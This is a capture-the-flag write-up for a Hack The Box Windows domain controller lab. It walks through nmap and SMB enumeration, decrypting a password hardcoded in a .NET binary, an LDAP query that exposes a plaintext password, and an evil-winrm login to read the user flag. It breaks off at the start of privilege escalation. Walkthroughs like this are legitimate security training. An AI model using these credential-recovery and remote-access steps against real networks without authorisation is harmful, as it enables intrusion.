# Support Windows Easy HTB Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV 10.129.230.181 -v 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-07 15:55 +0700
Host is up (0.32s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-07 09:02:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 5m35s
| smb2-time: 
|   date: 2026-07-07T09:02:23
|_  start_date: N/A

NSE: Script Post-scanning.
```
## SMB Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ smbclient -L \\\\10.129.230.181\\
Password for [WORKGROUP\jameskaois]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Get file in `support-tools`:
```bash
┌──(jameskaois㉿kali)-[~]
└─$ smbclient \\\\10.129.230.181\\support-tools
Password for [WORKGROUP\jameskaois]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 21 00:01:06 2022
  ..                                  D        0  Sat May 28 18:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 18:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 18:19:55 2022
  putty.exe                           A  1273576  Sat May 28 18:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 18:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 00:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 18:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 18:19:43 2022

                4026367 blocks of size 4096. 959524 blocks available
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (137.2 KiloBytes/sec) (average 137.2 KiloBytes/sec)
```
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/support]
└─$ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
                                                                                                                                   
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/support]
└─$ ls
CommandLineParser.dll                                      System.Buffers.dll                          UserInfo.exe
Microsoft.Bcl.AsyncInterfaces.dll                          System.Memory.dll                           UserInfo.exe.config
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Numerics.Vectors.dll                 UserInfo.exe.zip
Microsoft.Extensions.DependencyInjection.dll               System.Runtime.CompilerServices.Unsafe.dll
Microsoft.Extensions.Logging.Abstractions.dll              System.Threading.Tasks.Extensions.dll
                                                                                                                                   
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/support]
└─$ file UserInfo.exe
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```
## Inspecting `UserInfo.exe`
Since I'm using Linux machine, so we have to install package to see what is inside the `UserInfo.exe`
```
monodis UserInfo.exe > UserInfo.il
```
From `UserInfo.il` retrieve:
```
LDAP Credentials:
LDAP://support.htb
Username: support\ldap
Password: Protected::getPassword()

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
key = Encoding.ASCII.GetBytes("armando");

decryption routine:
password[i] = encrypted[i] ^ key[i % key.Length] ^ 0xDF;

```
Recover password:
```python
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

cipher = bytearray(base64.b64decode(enc))

for i in range(len(cipher)):
    cipher[i] ^= key[i % len(key)]
    cipher[i] ^= 0xDF

print(cipher.decode())
```
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/support]
└─$ python3 ./decrypt.py     
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
## Get user flag
```bash
ldapsearch -x \
-H ldap://support.htb \
-D 'support\ldap' \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'dc=support,dc=htb'
```
Important result:
```
dn: CN=support,CN=Users,DC=support,DC=htb  
...  
info: Ironside47pleasure40Watchful  
memberOf: CN=Shared Support Accounts,...  
memberOf: CN=Remote Management Users,...
```
Found the password `Ironside47pleasure40Watchful` for user `support`:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/support]
└─$ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> dir
*Evil-WinRM* PS C:\Users\support\Documents> ls
*Evil-WinRM* PS C:\Users\support\Documents> ls ..


    Directory: C:\Users\support


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         5/28/2022   4:17 AM                Desktop
d-r---         5/28/2022   4:16 AM                Documents
d-r---          5/8/2021   1:15 AM                Downloads
d-r---          5/8/2021   1:15 AM                Favorites
d-r---          5/8/2021   1:15 AM                Links
d-r---          5/8/2021   1:15 AM                Music
d-r---          5/8/2021   1:15 AM                Pictures
d-----          5/8/2021   1:15 AM                Saved Games
d-r---          5/8/2021   1:15 AM                Videos


*Evil-WinRM* PS C:\Users\support\Documents> ls ../Desktop


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          7/7/2026   2:00 AM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Documents> more ../Desktop/user.txt
b45f389cf13619a3c4ee048cc93c165c

*Evil-WinRM* PS C:\Users\support\Documents> 
```
## Privilege Escalation
```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb
```
Found `dc.support.htb`: